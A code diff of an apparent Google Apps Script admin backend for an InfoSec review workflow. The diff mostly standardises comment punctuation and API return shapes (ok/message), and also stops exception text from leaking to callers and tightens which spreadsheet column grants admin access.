@@ -1,5 +1,5 @@
 // ============================================================
-//  admin_code.js  (Admin — Phase 3 backend)
+//  admin_code.js  (Admin: Phase 3 backend)
 // ============================================================
 /*
   [ OUTLINE ]
@@ -116,7 +116,7 @@
              everywhere, so a tab rename only has to change here.
   TECHNICAL: Frozen-by-convention lookup map. Values must match the real tab names
              exactly (getSheet_ also tries a prefixed fallback). Do NOT repurpose
-             these to point at different tabs — PIA and DCS read the same sheets.
+             these to point at different tabs: PIA and DCS read the same sheets.
 */
 // ─── Sheet Name Constants (must match actual sheet tab names exactly) ─────────
 var SHEET_NAMES = {
@@ -129,7 +129,7 @@ var SHEET_NAMES = {
   INFOSEC_EMAIL_CONFIG: 'InfoSec_Email_Config',
   SYSTEM_CONFIG:        'System_Configuration',
   // PIA-owned tabs Admin only READS (and, for the retention sweep, purges). Added
-  // 2026-08-11 — they were previously referenced as string literals scattered in code.
+  // 2026-08-11, they were previously referenced as string literals scattered in code.
   APP_SNAPSHOTS:        'Application_Snapshots',
   EMAIL_QUEUE:          'Email_Queue',
   DRAFTS:               'Drafts'
@@ -143,7 +143,7 @@ var SHEET_NAMES = {
              suffix check; when false it returns true for everyone (bypass).
 */
 // ─── Domain Authorization Configuration ───────────────────────────────────────
-// DOMAIN Script Property — e.g. "companycorp.com" (no leading @)
+// DOMAIN Script Property: e.g. "companycorp.com" (no leading @)
 // Set in Project Settings → Script Properties.
 const ENABLED_DOMAIN_CHECK = true;
 
@@ -173,20 +173,20 @@ function getPrefix_() {
              via isAuthorizedDomain_; (4) Layer-2 member gate via checkAccess_;
              (5) serve the AdminView templated HTML. Denied responses are built with
              getStyledHtmlWrapper_.
-  PARAMS:    - e — GAS event; reads e.parameter.setup.
+  PARAMS:    - e: GAS event; reads e.parameter.setup.
   RETURNS:   HtmlOutput (the dashboard, a setup-complete page, or access-denied).
   EXAMPLE:   GET ?setup=companycorp.com -> "Domain Configured" page
 
   STEPS
-    Step 1 — Optional setup: persist ALLOWED_DOMAIN/DOMAIN, render confirmation.
-    Step 2 — Auto-config domain from caller if found in InfoSec_Email_Config.
-    Step 3 — Layer 1: reject non-corporate domains.
-    Step 4 — Layer 2: reject non-INFOSEC members.
-    Step 5 — Serve the AdminView template.
+    Step 1: Optional setup: persist ALLOWED_DOMAIN/DOMAIN, render confirmation.
+    Step 2: Auto-config domain from caller if found in InfoSec_Email_Config.
+    Step 3: Layer 1: reject non-corporate domains.
+    Step 4: Layer 2: reject non-INFOSEC members.
+    Step 5: Serve the AdminView template.
 */
 // ─── doGet() - Serve Admin View ────────────────────────────────────────────────
 function doGet(e) {
-  // Step 1 — One-time setup: visit ?setup=domain to configure ALLOWED_DOMAIN
+  // Step 1: One-time setup: visit ?setup=domain to configure ALLOWED_DOMAIN
   if (e && e.parameter && e.parameter.setup) {
     var domain = String(e.parameter.setup).trim().toLowerCase();
     if (domain) {
@@ -202,7 +202,7 @@ function doGet(e) {
     }
   }
 
-  /* Step 2 — Auto-configure ALLOWED_DOMAIN if not set and user is a known admin */
+  /* Step 2: Auto-configure ALLOWED_DOMAIN if not set and user is a known admin */
   var domainProps = PropertiesService.getScriptProperties().getProperty('ALLOWED_DOMAIN');
   if (!domainProps) {
     try {
@@ -272,19 +272,19 @@ function doGet(e) {
              apiKey, parse it and delegate to handleAdminApi_, returning JSON.
              (2) Otherwise enforce the domain gate. (3) If ?action=submitDCS_, run the
              submitDCS_ stub and return JSON. (4) Default: styled access-denied HTML.
-  PARAMS:    - e — GAS event; reads e.postData and e.parameter.action.
+  PARAMS:    - e: GAS event; reads e.postData and e.parameter.action.
   RETURNS:   ContentService JSON (API / submitDCS_) or HtmlOutput (denied).
-  EXAMPLE:   POST {apiKey, action:'getQueueSummary'} -> {success:true, data:{...}}
+  EXAMPLE:   POST {apiKey, action:'getQueueSummary'} -> {ok: true, data:{...}}
 
   STEPS
-    Step 1 — JSON API: parse body, dispatch to handleAdminApi_.
-    Step 2 — Domain gate for non-API posts.
-    Step 3 — Route ?action=submitDCS_ to submitDCS_.
-    Step 4 — Default deny.
+    Step 1: JSON API: parse body, dispatch to handleAdminApi_.
+    Step 2: Domain gate for non-API posts.
+    Step 3: Route ?action=submitDCS_ to submitDCS_.
+    Step 4: Default deny.
 */
 // ─── doPost() - Handle POST Requests ───────────────────────────────────────────
 function doPost(e) {
-  // Step 1 — Admin API: detect JSON payloads and route to handleAdminApi_
+  // Step 1: Admin API: detect JSON payloads and route to handleAdminApi_
   var postData = e && e.postData;
   if (postData && postData.type === 'application/json' && postData.contents) {
     try {
@@ -295,7 +295,11 @@ function doPost(e) {
           .setMimeType(ContentService.MimeType.JSON);
       }
     } catch (parseErr) {
-      return ContentService.createTextOutput(JSON.stringify({ ok: false, success: false, error: 'Invalid JSON payload: ' + parseErr.message }))
+      // F-06: was appending parseErr.message. A JSON parse error is tamer than a Sheets or
+      // Drive one, but this is the unauthenticated HTTP surface and there is no reason to
+      // echo any exception text back across it.
+      return ContentService.createTextOutput(JSON.stringify(safeError_(parseErr, ERR.VALIDATION,
+        'The request body could not be read as JSON.')))
         .setMimeType(ContentService.MimeType.JSON);
     }
   }
@@ -334,27 +338,27 @@ function doPost(e) {
 
 /*
   Function: checkAccess_
-  LAYMAN:    Layer-2 gate: confirms the caller is an authorized Admin — either an active
+  LAYMAN:    Layer-2 gate: confirms the caller is an authorized Admin, either an active
              InfoSec-role member (from InfoSec_Email_Config) OR anyone listed in the
              Admin_Notification_Config tab (e.g. ADMIN-001). The domain check already
              happened before this runs.
   TECHNICAL: Requires SPREADSHEET_ID. Matches the caller's email against (a) active rows in
-             InfoSec_Email_Config whose Role is "InfoSec" — matched by ROLE, NOT Member_ID,
-             so ID renames never lock admins out — and (b) the email column of
+             InfoSec_Email_Config whose Role is "InfoSec", matched by ROLE, NOT Member_ID,
+             so ID renames never lock admins out, and (b) the email column of
              Admin_Notification_Config. Respects an optional active/enabled flag. Fail-closed.
-  PARAMS:    - email — the active user's email.
+  PARAMS:    - email: the active user's email.
   RETURNS:   {allowed:true} or {allowed:false, reason:string}.
   EXAMPLE:   checkAccess_('ism@companycorp.com') -> {allowed:true}
 
   STEPS
-    Step 1 — Require SPREADSHEET_ID, else deny.
-    Step 2 — Allow active InfoSec-role members of InfoSec_Email_Config matching the email.
-    Step 3 — Allow any Admin_Notification_Config entry matching the email.
-    Step 4 — No match -> deny.
+    Step 1: Require SPREADSHEET_ID, else deny.
+    Step 2: Allow active InfoSec-role members of InfoSec_Email_Config matching the email.
+    Step 3: Allow any Admin_Notification_Config entry matching the email.
+    Step 4: No match -> deny.
 */
 // ─── Access Control ────────────────────────────────────────────────────────────
 function checkAccess_(email) {
-  // Step 1 — SPREADSHEET_ID must be set, or deny immediately
+  // Step 1: SPREADSHEET_ID must be set, or deny immediately
   var ssId = PropertiesService.getScriptProperties().getProperty('SPREADSHEET_ID');
   if (!ssId) {
     return { allowed: false, reason: 'SPREADSHEET_ID not configured.' };
@@ -377,7 +381,7 @@ function checkAccess_(email) {
     return true;
   }
 
-  // Step 2 — InfoSec personnel: any ACTIVE InfoSec-role member in InfoSec_Email_Config.
+  // Step 2: InfoSec personnel: any ACTIVE InfoSec-role member in InfoSec_Email_Config.
   //   Matched by Role (not Member_ID) so future ID renames never lock admins out.
   try {
     var configSheet = getSheet_('InfoSec_Email_Config');
@@ -393,14 +397,14 @@ function checkAccess_(email) {
       }
     }
   } catch (e) {
-    // InfoSec_Email_Config missing — fall through to Admin_Notification_Config
+    // InfoSec_Email_Config missing: fall through to Admin_Notification_Config
   }
 
-  // Step 3 — Configured admins: anyone listed in the Admin_Notification_Config tab.
+  // Step 3: Configured admins: anyone listed in the Admin_Notification_Config tab.
   //
   // Band-aid removed (2026-08-11): this used to loop EVERY column of the row and grant access if
   // ANY header matching /email/i held the caller's address. That is far too loose for an
-  // authorization check — the same tab also carries recipient/notification address columns, so a
+  // authorization check, the same tab also carries recipient/notification address columns, so a
   // person listed only as someone to *notify* would have been granted full admin rights. Match the
   // one intended column by name instead.
   var ADMIN_EMAIL_COLUMNS = ['Admin_Email', 'AdminEmail'];
@@ -437,10 +441,10 @@ function checkAccess_(email) {
       }
     }
   } catch (e) {
-    // Admin_Notification_Config tab not present — skip
+    // Admin_Notification_Config tab not present, skip
   }
 
-  // Step 4 — Not an authorized admin — deny
+  // Step 4: Not an authorized admin, deny
   return { allowed: false, reason: 'Access restricted to authorized ISM administrators and configured admins.' };
 }
 
@@ -448,7 +452,7 @@ function checkAccess_(email) {
   Function: getProp_
   LAYMAN:    One-liner that reads a single Script Property value.
   TECHNICAL: Thin wrapper over PropertiesService.getScriptProperties().getProperty.
-  PARAMS:    - key — property name.
+  PARAMS:    - key: property name.
   RETURNS:   String value, or null if unset.
 */
 // ─── Script Properties Helper ──────────────────────────────────────────────────
@@ -460,7 +464,7 @@ function getProp_(key) {
   Function: isOwnerContext_
 
   LAYMAN (Tropang Ex):
-  Bantay para sa mga function na hindi kayang bigyan ng trailing underscore — yung mga
+  Bantay para sa mga function na hindi kayang bigyan ng trailing underscore, yung mga
   pinapatakbo mo mismo sa Apps Script editor (forceAuthorize, testAdminApi, checkProperties).
   Kailangan silang public para makita sa Run dropdown, pero ibig sabihin nun kahit sinong
   naka-login sa domain kayang tawagin sila galing browser console. Tinatanong nito kung
@@ -470,7 +474,7 @@ function getProp_(key) {
   Under executeAs: USER_DEPLOYING, getEffectiveUser() is always the deploying account while
   getActiveUser() is the visitor. In an editor Run or a time-driven trigger both resolve to the
   owner, so equality implies owner-or-trigger context. Fails closed on a blank active user or any
-  Session error. Identical body to the Phase 1 and PIA copies — separate GAS projects cannot share
+  Session error. Identical body to the Phase 1 and PIA copies, separate GAS projects cannot share
   code, so keep the three in sync.
 
   PARAMS:    (none)
@@ -494,7 +498,7 @@ function isOwnerContext_() {
              DOMAIN (then ALLOWED_DOMAIN as fallback) and checks the email ends with
              '@' + that domain (case-insensitive). Fail-secure: missing config or any
              error returns false.
-  PARAMS:    - userEmail — the active user's email.
+  PARAMS:    - userEmail: the active user's email.
   RETURNS:   Boolean.
   EXAMPLE:   isAuthorizedDomain_('a@companycorp.com') -> true
 */
@@ -521,24 +525,24 @@ function isAuthorizedDomain_(userEmail) {
   TECHNICAL: Defense-in-depth stub. Re-checks isAuthorizedDomain_ even on the
              programmatic path (google.script.run / POST), then returns a success
              marker without persisting anything (real logic is a TODO).
-  PARAMS:    - payload — raw submission body (currently unused).
-  RETURNS:   {success:false, error} if domain fails, else {success:true, message}.
+  PARAMS:    - payload: raw submission body (currently unused).
+  RETURNS:   {ok: false, message} if domain fails, else {ok: true, message}.
 */
 function submitDCS_(payload) {
   var userEmail = Session.getActiveUser().getEmail();
 
-  // Domain Authorization Check (Layer 2 — defense-in-depth)
+  // Domain Authorization Check (Layer 2, defense-in-depth)
   if (!isAuthorizedDomain_(userEmail)) {
-    return { ok: false, success: false, error: 'Unauthorized domain. Access denied.' };
+    return { ok: false, message: 'Unauthorized domain. Access denied.' };
   }
 
   // TODO: Implement DCS submission logic here.
-  // Placeholder — returns success to indicate the gate passed.
-  return { ok: true, success: true, message: 'submitDCS_ not yet implemented. Domain check passed.' };
+  // Placeholder: returns success to indicate the gate passed.
+  return { ok: true, message: 'submitDCS_ not yet implemented. Domain check passed.' };
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
-// ADMIN REST API — called via JSON POST from the separate Admin Panel project
+// ADMIN REST API: called via JSON POST from the separate Admin Panel project
 // ═══════════════════════════════════════════════════════════════════════════════
 
 /*
@@ -558,23 +562,23 @@ var ADMIN_API_KEY = PropertiesService.getScriptProperties().getProperty('ADMIN_A
              result.
   TECHNICAL: Authenticates request.apiKey against ADMIN_API_KEY, then switch()es on
              request.action, forwarding request.params to the matching adminApi_*
-             function. Unknown actions and thrown errors return {success:false,error}.
-  PARAMS:    - request — {apiKey, action, params}.
+             function. Unknown actions and thrown errors return {ok: false, message}.
+  PARAMS:    - request: {apiKey, action, params}.
   RETURNS:   The chosen handler's result, or an error object.
   EXAMPLE:   handleAdminApi_({apiKey, action:'getQueueSummary', params:{}})
-             -> {success:true, data:{...}}
+             -> {ok: true, data:{...}}
 
   STEPS
-    Step 1 — Reject if apiKey missing or mismatched.
-    Step 2 — Dispatch action -> adminApi_* handler.
-    Step 3 — Unknown action / caught error -> error object.
+    Step 1: Reject if apiKey missing or mismatched.
+    Step 2: Dispatch action -> adminApi_* handler.
+    Step 3: Unknown action / caught error -> error object.
 */
 function handleAdminApi_(request) {
   try {
     // Authenticate
     var apiKey = String(request.apiKey || '').trim();
     if (!apiKey || !ADMIN_API_KEY || apiKey !== ADMIN_API_KEY) {
-      return { ok: false, success: false, error: 'Unauthorized: invalid or missing API key.' };
+      return { ok: false, message: 'Unauthorized: invalid or missing API key.' };
     }
 
     var action = String(request.action || '').trim();
@@ -612,11 +616,13 @@ function handleAdminApi_(request) {
         return adminApi_getPipelineView(params.sessionId);
 
       default:
-        return { ok: false, success: false, error: 'Unknown admin API action: ' + action };
+        return { ok: false, message: 'Unknown admin API action: ' + action };
     }
   } catch (e) {
     Logger.log('[ADMIN_API] Unhandled error in handleAdminApi_: ' + e.toString());
-    return { ok: false, success: false, error: 'Internal server error: ' + e.toString() };
+    // F-06: concatenated leak, missed by the original sweep for the same reason as
+    // PIA's doPost handler. The real exception is already in the Logger line above.
+    return safeError_(e, ERR.INTERNAL);
   }
 }
 
@@ -625,23 +631,23 @@ function handleAdminApi_(request) {
 /*
   Function: adminApi_getEmailQueue
   LAYMAN:    Lists the email "queue" for the Admin Panel. There is no real queue
-             table — every email attempt is logged in Risk_Audit, so this reads those
+             table, every email attempt is logged in Risk_Audit, so this reads those
              "Email ..." log rows and presents them as queue entries (recipient, type,
              status, attempts, last error), with optional filters.
   TECHNICAL: Reads Risk_Audit via sheetToObjects_, keeps rows whose Action starts with
              'email ', then filters by params.status (Action prefix), params.type and
              params.q (recipient substring) pulled from the InternalFlags JSON. Maps
              each to a queue DTO, applies params.limit, sorts by timestamp desc.
-  PARAMS:    - params — {status?, type?, q?, limit?}.
-  RETURNS:   {success:true, data:[queueEntry...], count} or {success:false, error}.
+  PARAMS:    - params: {status?, type?, q?, limit?}.
+  RETURNS:   {ok: true, data:[queueEntry...], count} or {ok: false, message}.
   EXAMPLE:   adminApi_getEmailQueue({type:'ism', limit:5})
-             -> {success:true, data:[...], count:3}
+             -> {ok: true, data:[...], count:3}
 */
 function adminApi_getEmailQueue(params) {
-  // SECURITY: re-authorize the caller — directly callable via google.script.run; require INFOSEC member.
+  // SECURITY: re-authorize the caller, directly callable via google.script.run; require INFOSEC member.
   var _me = Session.getActiveUser().getEmail();
   var _authz = checkAccess_(_me);
-  if (!_authz.allowed) return { ok: false, success: false, error: _authz.reason };
+  if (!_authz.allowed) return { ok: false, message: _authz.reason };
   try {
     var auditSheet;
     try { auditSheet = getSheet_(SHEET_NAMES.RISK_AUDIT); } catch(e) { return safeError_(e, ERR.INTERNAL); }
@@ -673,7 +679,7 @@ function adminApi_getEmailQueue(params) {
     var limit = parseInt(params.limit, 10) || 0;
     if (limit > 0) results = results.slice(0, limit);
     results.sort(function(a,b){ return b.timestamp.localeCompare(a.timestamp); });
-    return { ok: true, success: true, data: results, count: results.length };
+    return { ok: true, data: results, count: results.length };
   } catch (e) { return safeError_(e, ERR.INTERNAL); }
 }
 
@@ -686,15 +692,15 @@ function adminApi_getEmailQueue(params) {
              ('email sent'/'email failed'/'email cancelled') and counts sent-today
              against midnight. Tallies flags.type. queueHealth = pending/total * 100.
              (Note: the "pending" tally here counts 'email sent' rows.)
-  PARAMS:    - params — unused; kept for signature uniformity.
-  RETURNS:   {success:true, data:{totalPending, sentToday, totalFailed,
-             totalCancelled, queueHealth, byType}} or {success:false, error}.
+  PARAMS:    - params: unused; kept for signature uniformity.
+  RETURNS:   {ok: true, data:{totalPending, sentToday, totalFailed,
+             totalCancelled, queueHealth, byType}} or {ok: false, message}.
 */
 function adminApi_getQueueSummary(params) {
   // SECURITY: re-authorize the caller (see adminApi_getEmailQueue).
   var _me = Session.getActiveUser().getEmail();
   var _authz = checkAccess_(_me);
-  if (!_authz.allowed) return { ok: false, success: false, error: _authz.reason };
+  if (!_authz.allowed) return { ok: false, message: _authz.reason };
   try {
     var ss = getSpreadsheet_();
     var auditSheet;
@@ -722,7 +728,7 @@ function adminApi_getQueueSummary(params) {
     }
     var total = pending + failed + cancelled;
     var health = total > 0 ? Math.round((pending / total) * 100) : 100;
-    return { ok: true, success: true, data: {
+    return { ok: true, data: {
       totalPending: pending, sentToday: sentToday, totalFailed: failed,
       totalCancelled: cancelled, queueHealth: health, byType: typeCounts
     }};
@@ -733,7 +739,7 @@ function adminApi_getQueueSummary(params) {
   Function: adminApi_getFailedEmails_
   LAYMAN:    Thin REST alias for the failed-email lookup.
   TECHNICAL: Delegates to adminGetFailedEmails(sinceDays).
-  PARAMS:    - sinceDays — lookback window in days.
+  PARAMS:    - sinceDays: lookback window in days.
   RETURNS:   adminGetFailedEmails' result.
 */
 function adminApi_getFailedEmails_(sinceDays) {
@@ -744,7 +750,7 @@ function adminApi_getFailedEmails_(sinceDays) {
   Function: adminApi_getEmailLog_
   LAYMAN:    Thin REST alias for one session's email log.
   TECHNICAL: Delegates to adminGetEmailLog(sessionId).
-  PARAMS:    - sessionId — session/application ID.
+  PARAMS:    - sessionId: session/application ID.
   RETURNS:   adminGetEmailLog' result.
 */
 function adminApi_getEmailLog_(sessionId) {
@@ -772,25 +778,25 @@ function adminApi_resendEmail_(sessionId, recipient, type) {
   TECHNICAL: Locates the Risk_Audit row by LogID whose Action starts with
              'Email Failed', increments InternalFlags.attempts, nulls flags.error,
              and sets Action to 'Email Pending (Retried)'. Writes only the two cells.
-  PARAMS:    - queueId — the LogID of the failed row.
-  RETURNS:   {success:true, message} or {success:false, error} (incl. not-found).
+  PARAMS:    - queueId: the LogID of the failed row.
+  RETURNS:   {ok: true, message} or {ok: false, message} (incl. not-found).
 */
 function adminApi_retryQueuedEmail(queueId) {
-  // SECURITY: re-authorize the caller — adminApi_* functions are directly callable via google.script.run,
+  // SECURITY: re-authorize the caller, adminApi_* functions are directly callable via google.script.run,
   // bypassing the ADMIN_API_KEY dispatch gate; require an INFOSEC member.
   var _me = Session.getActiveUser().getEmail();
   var _authz = checkAccess_(_me);
-  if (!_authz.allowed) return { ok: false, success: false, error: _authz.reason };
+  if (!_authz.allowed) return { ok: false, message: _authz.reason };
   try {
     var ss = getSpreadsheet_();
     var auditSheet = ss.getSheetByName(SHEET_NAMES.RISK_AUDIT);
-    if (!auditSheet) return { ok: false, success: false, error: 'Risk_Audit sheet not found.' };
+    if (!auditSheet) return { ok: false, message: 'Risk_Audit sheet not found.' };
     var data = readSheetValues_(auditSheet);
     var header = data[0];
     var logIdIdx = header.indexOf('LogID');
     var actionIdx = header.indexOf('Action');
     var flagsIdx = header.indexOf('InternalFlags');
-    if (logIdIdx === -1) return { ok: false, success: false, error: 'LogID column not found.' };
+    if (logIdIdx === -1) return { ok: false, message: 'LogID column not found.' };
     for (var i = 1; i < data.length; i++) {
       if (String(data[i][logIdIdx]) === String(queueId) && String(data[i][actionIdx]).indexOf('Email Failed') === 0) {
         if (flagsIdx !== -1) {
@@ -801,10 +807,10 @@ function adminApi_retryQueuedEmail(queueId) {
           auditSheet.getRange(i+1, flagsIdx+1).setValue(JSON.stringify(flags));
         }
         auditSheet.getRange(i+1, actionIdx+1).setValue('Email Pending (Retried)');
-        return { ok: true, success: true, message: 'Queue entry retried.' };
+        return { ok: true, message: 'Queue entry retried.' };
       }
     }
-    return { ok: false, success: false, error: 'Queue entry not found or not in failed state.' };
+    return { ok: false, message: 'Queue entry not found or not in failed state.' };
   } catch (e) { return safeError_(e, ERR.INTERNAL); }
 }
 
@@ -816,27 +822,27 @@ function adminApi_retryQueuedEmail(queueId) {
   TECHNICAL: Scans Risk_Audit for rows matching SessionID (and, if status given, whose
              Action starts with that status). For each, resets InternalFlags.attempts
              to 0, clears error, sets Action to 'Email Pending (Retried)'.
-  PARAMS:    - sessionId — required.
-             - status — optional Action-prefix filter (e.g. 'Email Failed').
-  RETURNS:   {success:true, retried:n, message} or {success:false, error}.
+  PARAMS:    - sessionId: required.
+             - status: optional Action-prefix filter (e.g. 'Email Failed').
+  RETURNS:   {ok: true, retried:n, message} or {ok: false, message}.
 */
 function adminApi_retryAllForSession(sessionId, status) {
   // SECURITY: re-authorize the caller (see adminApi_retryQueuedEmail).
   var _me = Session.getActiveUser().getEmail();
   var _authz = checkAccess_(_me);
-  if (!_authz.allowed) return { ok: false, success: false, error: _authz.reason };
+  if (!_authz.allowed) return { ok: false, message: _authz.reason };
   try {
-    if (!sessionId) return { ok: false, success: false, error: 'Session ID required.' };
+    if (!sessionId) return { ok: false, message: 'Session ID required.' };
     sessionId = String(sessionId).trim();
     var ss = getSpreadsheet_();
     var auditSheet = ss.getSheetByName(SHEET_NAMES.RISK_AUDIT);
-    if (!auditSheet) return { ok: false, success: false, error: 'Risk_Audit sheet not found.' };
+    if (!auditSheet) return { ok: false, message: 'Risk_Audit sheet not found.' };
     var data = readSheetValues_(auditSheet);
     var header = data[0];
     var sessionIdx = header.indexOf('SessionID');
     var actionIdx = header.indexOf('Action');
     var flagsIdx = header.indexOf('InternalFlags');
-    if (sessionIdx === -1 || actionIdx === -1) return { ok: false, success: false, error: 'Required columns not found.' };
+    if (sessionIdx === -1 || actionIdx === -1) return { ok: false, message: 'Required columns not found.' };
     var retried = 0;
     for (var i = 1; i < data.length; i++) {
       if (String(data[i][sessionIdx]) !== sessionId) continue;
@@ -853,7 +859,7 @@ function adminApi_retryAllForSession(sessionId, status) {
       auditSheet.getRange(i+1, actionIdx+1).setValue('Email Pending (Retried)');
       retried++;
     }
-    return { ok: true, success: true, retried: retried, message: retried + ' queue entries retried.' };
+    return { ok: true, retried: retried, message: retried + ' queue entries retried.' };
   } catch (e) { return safeError_(e, ERR.INTERNAL); }
 }
 
@@ -865,21 +871,21 @@ function adminApi_retryAllForSession(sessionId, status) {
              targets only Action starting with 'email sent' or 'email pending', and
              (if type given) matches InternalFlags.type. Sets Action to
              'Email Cancelled'.
-  PARAMS:    - sessionId — required.
-             - type — optional flags.type filter.
-  RETURNS:   {success:true, cancelled:n, message} or {success:false, error}.
+  PARAMS:    - sessionId: required.
+             - type: optional flags.type filter.
+  RETURNS:   {ok: true, cancelled:n, message} or {ok: false, message}.
 */
 function adminApi_cancelQueuedEmails(sessionId, type) {
   // SECURITY: re-authorize the caller (see adminApi_retryQueuedEmail).
   var _me = Session.getActiveUser().getEmail();
   var _authz = checkAccess_(_me);
-  if (!_authz.allowed) return { ok: false, success: false, error: _authz.reason };
+  if (!_authz.allowed) return { ok: false, message: _authz.reason };
   try {
-    if (!sessionId) return { ok: false, success: false, error: 'Session ID required.' };
+    if (!sessionId) return { ok: false, message: 'Session ID required.' };
     sessionId = String(sessionId).trim();
     var ss = getSpreadsheet_();
     var auditSheet = ss.getSheetByName(SHEET_NAMES.RISK_AUDIT);
-    if (!auditSheet) return { ok: false, success: false, error: 'Risk_Audit sheet not found.' };
+    if (!auditSheet) return { ok: false, message: 'Risk_Audit sheet not found.' };
     var data = readSheetValues_(auditSheet);
     var header = data[0];
     var sessionIdx = header.indexOf('SessionID');
@@ -900,7 +906,7 @@ function adminApi_cancelQueuedEmails(sessionId, type) {
       auditSheet.getRange(i+1, actionIdx+1).setValue('Email Cancelled');
       cancelled++;
     }
-    return { ok: true, success: true, cancelled: cancelled, message: cancelled + ' emails cancelled.' };
+    return { ok: true, cancelled: cancelled, message: cancelled + ' emails cancelled.' };
   } catch (e) { return safeError_(e, ERR.INTERNAL); }
 }
 
@@ -914,14 +920,14 @@ function adminApi_cancelQueuedEmails(sessionId, type) {
   TECHNICAL: Scans System_Configuration key/value rows for ADMIN_NOTIFY_EMAIL,
              NOTIFY_ON_FAILURE, NOTIFY_REQUESTOR; YES/NO -> boolean.
   PARAMS:    (none)
-  RETURNS:   {success:true, data:{adminEmail, notifyOnFailure, notifyRequestor}}
-             or {success:false, error}.
+  RETURNS:   {ok: true, data:{adminEmail, notifyOnFailure, notifyRequestor}}
+             or {ok: false, message}.
 */
 function adminApi_getNotificationConfig() {
   // SECURITY: re-authorize the caller (see adminApi_getEmailQueue).
   var _me = Session.getActiveUser().getEmail();
   var _authz = checkAccess_(_me);
-  if (!_authz.allowed) return { ok: false, success: false, error: _authz.reason };
+  if (!_authz.allowed) return { ok: false, message: _authz.reason };
   try {
     var sysSheet;
     try { sysSheet = getSheet_(SHEET_NAMES.SYSTEM_CONFIG); } catch(e) { return safeError_(e, ERR.INTERNAL); }
@@ -934,7 +940,7 @@ function adminApi_getNotificationConfig() {
       if (key === 'NOTIFY_ON_FAILURE') config.notifyOnFailure = val.toUpperCase() === 'YES';
       if (key === 'NOTIFY_REQUESTOR') config.notifyRequestor = val.toUpperCase() === 'YES';
     }
-    return { ok: true, success: true, data: config };
+    return { ok: true, data: config };
   } catch (e) { return safeError_(e, ERR.INTERNAL); }
 }
 
@@ -946,16 +952,16 @@ function adminApi_getNotificationConfig() {
              NOTIFY_REQUESTOR (booleans -> YES/NO), rewrites matching
              System_Configuration rows in one setValues, then appendRow for any
              missing keys. Only provided fields are touched.
-  PARAMS:    - config — {adminEmail?, notifyOnFailure?, notifyRequestor?}.
-  RETURNS:   {success:true, message} or {success:false, error}.
+  PARAMS:    - config: {adminEmail?, notifyOnFailure?, notifyRequestor?}.
+  RETURNS:   {ok: true, message} or {ok: false, message}.
 */
 function adminApi_setNotificationConfig(config) {
-  // SECURITY: re-authorize the caller — config write (see adminApi_retryQueuedEmail).
+  // SECURITY: re-authorize the caller, config write (see adminApi_retryQueuedEmail).
   var _me = Session.getActiveUser().getEmail();
   var _authz = checkAccess_(_me);
-  if (!_authz.allowed) return { ok: false, success: false, error: _authz.reason };
+  if (!_authz.allowed) return { ok: false, message: _authz.reason };
   try {
-    if (!config || typeof config !== 'object') return { ok: false, success: false, error: 'config object required.' };
+    if (!config || typeof config !== 'object') return { ok: false, message: 'config object required.' };
     var ss = getSpreadsheet_();
     var sysSheet;
     try { sysSheet = getSheet_(SHEET_NAMES.SYSTEM_CONFIG); } catch(e) { return safeError_(e, ERR.INTERNAL); }
@@ -963,7 +969,7 @@ function adminApi_setNotificationConfig(config) {
     var header = data[0];
     var keyIdx = header.indexOf('Configuration_Key');
     var valIdx = header.indexOf('Value');
-    if (keyIdx === -1 || valIdx === -1) return { ok: false, success: false, error: 'System_Configuration columns not found.' };
+    if (keyIdx === -1 || valIdx === -1) return { ok: false, message: 'System_Configuration columns not found.' };
     var updates = {};
     if (config.adminEmail !== undefined) updates['ADMIN_NOTIFY_EMAIL'] = String(config.adminEmail);
     if (config.notifyOnFailure !== undefined) updates['NOTIFY_ON_FAILURE'] = config.notifyOnFailure ? 'YES' : 'NO';
@@ -983,7 +989,7 @@ function adminApi_setNotificationConfig(config) {
     for (var uk in updates) {
       if (!existing[uk]) sysSheet.appendRow([uk, updates[uk]]);
     }
-    return { ok: true, success: true, message: 'Notification config updated.' };
+    return { ok: true, message: 'Notification config updated.' };
   } catch (e) { return safeError_(e, ERR.INTERNAL); }
 }
 
@@ -991,43 +997,43 @@ function adminApi_setNotificationConfig(config) {
 
 /*
   Function: adminApi_resendToStage_
-  LAYMAN:    Re-sends the notification for a particular stage of a request — the
-             department approver, the ISM reviewer, or the Division Head — when an
+  LAYMAN:    Re-sends the notification for a particular stage of a request, the
+             department approver, the ISM reviewer, or the Division Head, when an
              email got stuck.
   TECHNICAL: Validates stageType in {approver, ism, divhead}, confirms the
              application exists, then dispatches: 'approver' -> notifyApprover_(.,0),
              'ism' -> apiPhase3_NotifyISMember_(.,1), 'divhead' -> verifies a
              DivisionHead_Approval_Workflow row then notifyApplicant_(., 'Escalated to
              Division Head'). On success, logs an 'Email Resend (Admin API)' audit row.
-  PARAMS:    - sessionId — required.
-             - stageType — 'approver' | 'ism' | 'divhead'.
-             - approverEmail — optional, recorded in the audit flags.
-  RETURNS:   The underlying notify result, or {success:false, error}.
+  PARAMS:    - sessionId: required.
+             - stageType: 'approver' | 'ism' | 'divhead'.
+             - approverEmail: optional, recorded in the audit flags.
+  RETURNS:   The underlying notify result, or {ok: false, message}.
 
   STEPS
-    Step 1 — Validate sessionId and stageType.
-    Step 2 — Confirm the application exists.
-    Step 3 — Dispatch to the stage-appropriate notifier.
-    Step 4 — Log audit on success.
+    Step 1: Validate sessionId and stageType.
+    Step 2: Confirm the application exists.
+    Step 3: Dispatch to the stage-appropriate notifier.
+    Step 4: Log audit on success.
 */
 function adminApi_resendToStage_(sessionId, stageType, approverEmail) {
   try {
-    if (!sessionId) return { ok: false, success: false, error: 'Session ID required.' };
+    if (!sessionId) return { ok: false, message: 'Session ID required.' };
     sessionId = String(sessionId).trim();
     var validStages = ['approver', 'ism', 'divhead'];
     var normalizedStage = String(stageType || '').toLowerCase().trim();
     if (validStages.indexOf(normalizedStage) === -1) {
-      return { ok: false, success: false, error: 'Invalid stage type: ' + stageType + '. Must be approver, ism, or divhead.' };
+      return { ok: false, message: 'Invalid stage type: ' + stageType + '. Must be approver, ism, or divhead.' };
     }
     var app = getApplicationData_(sessionId);
-    if (!app) return { ok: false, success: false, error: 'Application not found.' };
+    if (!app) return { ok: false, message: 'Application not found.' };
     var result;
     if (normalizedStage === 'approver') {
       result = notifyApprover_(sessionId, 0); // first step
     } else if (normalizedStage === 'ism') {
       result = apiPhase3_NotifyISMember_(sessionId, 1);
     } else if (normalizedStage === 'divhead') {
-      // Re-notify via DH path — write to DivisionHead_Approval_Workflow
+      // Re-notify via DH path: write to DivisionHead_Approval_Workflow
       var ss = getSpreadsheet_();
